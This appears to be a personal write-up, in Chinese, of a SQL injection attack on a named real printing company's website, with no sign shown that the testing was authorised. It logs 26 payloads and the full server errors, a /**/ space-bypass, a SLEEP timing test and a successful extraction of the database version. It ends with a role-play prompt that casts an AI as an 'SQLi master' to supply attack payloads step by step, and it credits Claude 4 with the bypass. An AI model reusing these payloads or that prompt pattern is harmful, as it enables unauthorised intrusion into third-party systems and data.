---
title: SQL Injection topone-print Success
description: SQL Injection topone-print Success
last_update:
  date: "2025-08-17T08:00:00+08:00"
---

## 前言

1. 這是一個 URL Path 的 SQL Injection，目標是 `https://www.topone-print.com.tw/company.html`，可在 `company.html` 後面注入 SQL Injection Payload
2. Server (PHP) 會直接把 URL Encoded 的字串塞到 SQL 語法，例如 ` ` => `%20`，所以只要有包含 ` ` 的 SQL Injection Payload 都無效，例如 MYSQL 常用的註解 `-- 123`
3. 就在我即將放棄之前，跟 Claude 4 又再進行一輪問答以及實測，得出 `/**/` 可以取代 ` `，於是這個 SQL Injection 的路又重新復活了！

## 測試流程

1. `'`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' AND meta_type = '1'' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

2. `')`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 AND meta_fname != '' AND meta_memo <> '' AND metaset = '1' AND meta...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

3. `' AND extractvalue(1, concat(0x7e, version(), 0x7e)) AND '1'='1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%20concat(0x7e,%20version(),%200x7e))%20AND%20'1'='1') != 0 AND meta_fname !=...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

可以看到 ` concat` 直接變成 SQL 語法的 `%20concat`，PHP Server 直接把 URL Encode 過後的結果塞到 SQL 語法 => 代表空格會注入失敗

4. `' AND extractvalue(1,concat(0x7e,version())) AND '1'='1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '='1') != 0 AND meta_fname != '' AND meta_memo <> '' AND meta_set = '1' AND me...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

5. `' AND extractvalue(1,concat(0x7e,version(),0x7e)) AND ('1'='1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '('1'='1') != 0 AND meta_fname != '' AND meta_memo <> '' AND meta_set = '1' AN...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

6. `' OR extractvalue(1,concat(0x7e,version(),0x7e)) OR '1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1583 Incorrect parameters in the call to native function 'Locate' in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

終於看到新的錯誤(感動，`Incorrect parameters in the call to native function 'Locate'`，代表原始的 SQL 語法有一個 `Locate` 函數

7. `', (SELECT version()), 1) OR LOCATE('1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%20(SELECT%20version()),%201)%20OR%20LOCATE('1') != 0 AND meta_fname != '' AN...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

8. `') AND 1=1 --`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' AND meta_type = '1'' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

9. `') AND 1=1#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 AND meta_fname != '' AND meta_memo <> '' AND metaset = '1' AND meta...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

10. `') AND extractvalue(1,concat(0x7e,version(),0x7e))#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 AND meta_fname != '' AND meta_memo <> '' AND metaset = '1' AND meta...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

11. `test') AND updatexml(null,concat(0x7e,version(),0x7e),null)#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 AND meta_fname != '' AND meta_memo <> '' AND metaset = '1' AND meta...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

12. `') AND 1=1 AND LOCATE('a','a')>0#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 AND meta_fname != '' AND meta_memo <> '' AND metaset = '1' AND meta...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

13. `test') OR 1=1#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 AND meta_fname != '' AND meta_memo <> '' AND metaset = '1' AND meta...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

14. `test','test') OR 1=1#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') != 0 AND meta_fname != '' AND meta_memo <> '' AND metaset = '1' AND meta...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

15. `test', meta_field) OR 1=1 OR LOCATE('1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%20meta_field)%20OR%201=1%20OR%20LOCATE('1') != 0 AND meta_fname != '' AND me...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

16. `test', 'a') OR 1=1 OR LOCATE('1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%20'a')%20OR%201=1%20OR%20LOCATE('1') != 0 AND meta_fname != '' AND meta_memo...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

17. `test', 1) OR 1=1 OR LOCATE(1,1) OR LOCATE(1`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%201)%20OR%201=1%20OR%20LOCATE(1,1)%20OR%20LOCATE(1') != 0 AND meta_fname != ...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

18. `test', 1) OR 1=1#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%201)%20OR%201=1') != 0 AND meta_fname != '' AND meta_memo <> '' AND meta_set...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

19. `test', 1) OR 1=2#`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%201)%20OR%201=2') != 0 AND meta_fname != '' AND meta_memo <> '' AND meta_set...' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

20. `test') OR 1=1 OR LOCATE('dummy`

```
Fatal error: Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column '20OR' in 'WHERE' in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

Unknown column '20OR' 代表 ` OR` => `%20OR` => `20OR` 被當作 column

21. `test')/**/OR/**/1=1/**/OR/**/LOCATE('dummy`

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1582 Incorrect parameter count in the call to native function 'LOCATE' in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

Incorrect parameter count in the call to native function 'LOCATE'，重要的進展！

22. `test')/**/OR/**/1=1/**/OR/**/LOCATE('dummy','dummy`

沒看到錯誤訊息

23.

```
test')/**/OR/**/1=(SELECT/**/CAST(version()/**/AS/**/SIGNED))/**/OR/**/LOCATE('dummy','dummy
test')/**/OR/**/1=(SELECT/**/999999)/**/OR/**/LOCATE('dummy','dummy
test')/**/AND/**/1=0/**/AND/**/LOCATE('dummy','dummy
```

都沒看到錯誤訊息

24. `test')/**/AND/**/SLEEP(5)/**/AND/**/LOCATE('dummy','dummy`，有明顯延遲，大概 10 秒以上

25. `test')/**/UNION/**/SELECT/**/1,2,3,4,5,version(),7,8,9/**/OR/**/LOCATE('dummy','dummy`

```
Fatal error: Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'meta_fname' in 'SELECT' in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

Unknown column 'meta_fname' in 'SELECT'，這應該是原始 SQL 語法的錯誤

26. `test')/**/AND/**/extractvalue(1,concat(0x7e,version(),0x7e))/**/OR/**/LOCATE('dummy','dummy`

```
Fatal error: Uncaught PDOException: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~10.6.20-MariaDB-cll-lve~' in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```

成功從 `'~10.6.20-MariaDB-cll-lve~'` 提取到 `version()` = `10.6.20-MariaDB-cll-lve`

27. 接下來請參考

## 學到的東西

1. 如果在 ` ` 無法正確注入的情況，可以用 `/**/` 來取代 ` `
2. [LOCATE()](https://www.w3schools.com/sql/func_mysql_locate.asp)
3. 一開始跟 AI 對話時，建議要把完整的現況交代清楚，清楚的告知任務，並且賦予 AI 一個角色，例如

```
你是 SQLi 大師，
任務: 分析一個 SQLi，每次請提供一個 Payload 以及解釋攻擊手法
情境: URL Path Based SQLi
target: https://www.domain.com.tw/company.html
SQLi Payload: https://www.domain.com.tw/company.html'
Error Message: Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' AND meta_type = '1'' at line 1 in /home2/topone/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home2/topone/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home2/topone/public_html/includes/lib_main.php(32): DB->GetRow('SELECT * FROM m...') #2 /home2/topone/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home2/topone/public_html/company.php(8): require_once('/home2/topone/p...') #4 {main} thrown in /home2/topone/public_html/includes/cls_mysql.php on line 44
```
